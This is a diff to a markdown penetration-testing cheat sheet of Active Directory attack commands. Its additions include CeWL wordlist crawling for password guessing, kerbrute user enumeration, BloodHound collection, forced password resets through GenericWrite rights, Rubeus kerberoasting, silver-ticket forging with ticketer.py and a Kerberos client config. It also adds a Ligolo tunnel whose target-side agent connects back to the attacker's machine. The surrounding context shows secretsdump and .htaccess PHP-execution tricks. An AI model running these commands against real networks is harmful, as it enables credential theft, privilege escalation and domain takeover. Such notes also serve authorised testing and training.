@@ -143,8 +143,12 @@ On a php webserver with a valid URL parameter,
 |`zip:///pathtoZIP#filename`|Unzips and runs `filename.php`|
 [OWASP](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)  
 
-## .htaccess
+### .htaccess
 If it can be replaced or edited, add `AddType application/x-httpd-php .txt` to make it execute `.txt` files within that directory as php.  
+
+### CeWL
+	cewl -w words.txt http://123.123.123.123
+Crawl and generate wordlist for password guessing  
 
 ### Magic hashes
 PHP Loose comparison with magic hashes (0e...)  
@@ -652,6 +656,9 @@ Requires:
 1. Library file can be written into a valid folder for reading libraries  
 1. OS user running MySQL is some other user  
 
+## AD - user enumeration
+	kerbrute userenum -d domain.com --dc <dc-ip> user.list
+
 ## AD - Powerview
 	Get-NetGroup
 Get all groups  
@@ -675,9 +682,12 @@ List shares accessible to current user
 	Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "corp audit"
 On target machine  
 
+	bloodhound-python -d domain.com -u 'user' -p 'password' -dc dc01.domain.com -c all -ns <dns-ip>
+Or directly from Kali  
+
 	sudo neo4j start
 	bloodhound
-Start bloodhound  
+Start bloodhound and upload zip  
 
 ## AD - Check LAPS
 	Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" | ? { $_."ms-mcs-admpwdexpirationtime" -ne $null } | select DnsHostname
@@ -687,6 +697,7 @@ Use powerview to see if LAPS are enabled for any machines
 See who can see LAPS  
 
 ## AD - GenericWrite/GenericAll
+1. Reset password of account: `net rpc password <samAccountName> 'newpassword' -U domain/user%'password' -S dc01.domain.com`
 1. Set account to no-preauth, asrep roast, crack hash  
 1. Set SPN for account, kerberoast, crack hash  
 
@@ -708,7 +719,10 @@ Kali version
 
 ## AD - Kerberoasting TGSREP
 	./Rubeus.exe kerberoast /outfile:hashes.txt /format:hashcat
-Crack with mode 13100
+Crack with mode 13100    
+
+	./Rubeus.exe kerberoast /creduser:domain.com\username /credpassword:password /dc:<dc-ip> /domain:domain.com
+If `No credentials are available in the security package`, you may have to try it with explicit creds as above (or as another user).  
 
 	impacket-GetUserSPNs -dc-ip 123.123.123.123 -request -outputfile hashes.txt domain.com/user
 Kali version  
@@ -723,6 +737,39 @@ in mimikatz
 
 	impacket-secretsdump -just-dc-user targetuser corp.com/user:"password"@123.123.123.123
 from Kali  
+
+## AD - Kali Kerberos auth
+	ticketer.py -nthash <spn hash> -domain-sid <domain sid> -domain domain.com -spn <service principal name> Administrator
+Silver ticket  
+
+	export KRB5CCNAME=$pwd/Administrator.ccache
+	klist
+`klist` to check that the ccache is loaded.  
+
+In `/etc/krb5.conf`  
+
+	[libdefaults]  
+        default_realm = DOMAIN.COM  
+        kdc_timesync = 1  
+        ccache_type = 4  
+        forwardable = true  
+        proxiable = true  
+    rdns = false  
+    dns_canonicalize_hostname = false  
+        fcc-mit-ticketflags = true  
+
+	[realms]          
+        DOMAIN.COM = {  
+                kdc = dc01.domain.com  
+        }  
+
+	[domain_realm]  
+        .domain.com = DOMAIN.COM
+
+
+Then, use your impacket or winrm with `-k` flag.  The target must be the domain name of the device. Rename `/etc/hosts` if needed. E.g.  
+
+	impacket-mssqlclient -k dc01.domain.com
 
 # STAGE 3.5 - PIVOT
 ## Windows - port forwarding
@@ -759,6 +806,23 @@ proxychain nmap portscan on one host
 
 	proxychains xfreerdp /v:INTERNALIP /u:username /p:password
 proxychain rdp connect  
+
+## Ligolo
+	sudo ./proxy -selfcert
+On kali  
+
+	./agent.exe -connect <kali-ip>:11601 -ignore-cert
+On target  
+
+From ligolo UI:  
+
+	session
+Select session  
+
+	interface_create --name <domainname>
+	interface_add_route --name <domainname> --route <internal-subnet>
+	tunnel_start --tun <domainname>
+For accessing localhost ports on tunnelling device, replace internal subnet route with `240.0.0.1/32`  
 
 ## Tunnel through existing proxy
 E.g. squid proxy  
